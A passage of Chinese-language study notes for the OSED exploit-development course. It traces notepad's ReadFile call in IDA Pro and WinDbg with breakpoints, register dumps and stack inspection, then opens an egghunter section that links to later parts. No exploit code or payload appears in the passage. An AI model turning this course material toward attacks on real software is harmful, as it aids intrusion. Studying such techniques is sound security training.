>- dwFlagsAndAttributes：旗標及檔案屬性
>- hTemplateFile：範本檔案 Handle
>
>當 IDA 能辨識 API 原型時，就能把程式碼中的參數位置與名稱對應起來。

追蹤同一個函式中是否有呼叫 [ReadFile](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-readfile)\
![image](https://hackmd.io/_uploads/rJFJIMJpMl.png)
> IDA Pro 將位址 `0xF950A4` 處的 EAX 內容標記為 lpBuffer\
> 根據 ReadFile 文檔，這是一個指向記憶體緩衝區的指針，該緩衝區用於接收從文件中讀取的資料\
> ![image](https://hackmd.io/_uploads/SyPePfkTfe.png)

實驗在 windbg 透過在位址 `0xF950A6` (範例: `f250a6`) 設斷點讓程式繼續執行
```dbg
0:000> bp f250a6

0:000> g
Breakpoint 1 hit
eax=007fec28 ebx=00000640 ecx=3b76cea0 edx=00000000 esi=00bf7794 edi=04b88178
eip=00f250a6 esp=007febf8 ebp=007ff02c iopl=0         nv up ei pl nz ac pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200217
notepad!UpdateEncoding+0x7e:
00f250a6 ff15c401f400    call    dword ptr [notepad!_imp__ReadFile (00f401c4)] ds:0023:00f401c4={KERNEL32!ReadFile (75c2c5e0)}

0:000> dds esp L5
007febf8  00000640
007febfc  007fec28
007fec00  00000400
007fec04  007fec20
007fec08  00000000
```
> 中斷點設在 call 指令本身，所以此時我們看到的是呼叫 API 之前的狀態:\
> `call dword ptr [notepad!_imp__ReadFile]`\
> ![image](https://hackmd.io/_uploads/S14u9MJ6zl.png)

`p` 執行目前的 call ReadFile，並停在呼叫返回後的下一條指令
```dbg
0:000> p
eax=00000001 ebx=00000640 ecx=3b092550 edx=77e71670 esi=00bf7794 edi=04b88178
eip=00f250ac esp=007fec0c ebp=007ff02c iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200202
notepad!UpdateEncoding+0x84:
00f250ac 85c0            test    eax,eax

0:000> da 007fec28  
007fec28  "Test ..w."
```

IDA Pro 和 WinDbg  之間搭配瀏覽執行流程

# Overcoming Space Restrictions: Egghunters

>[!Caution]
> HackMD 筆記長度限制，接續 [[OSED, EXP-301] Instructional notes - Part 3](https://chw41.github.io/b1og/osed-exp-301-instructional-notes---part-3/)
 
# [Link to: "[OSED, EXP-301] Instructional notes - Part 3"](https://chw41.github.io/b1og/osed-exp-301-instructional-notes---part-3/)

# [Link to: "[OSED, EXP-301] Instructional notes - Part 4"](https://chw41.github.io/b1og/osed-exp-301-instructional-notes---part-4/)

# [Link to: "[OSED, EXP-301] Instructional notes - Part 5"](https://chw41.github.io/b1og/osed-exp-301-instructional-notes---part-5/)

# [Link to: "[OSED, EXP-301] Instructional notes - Part 6"](https://chw41.github.io/b1og/osed-exp-301-instructional-notes---part-6/)
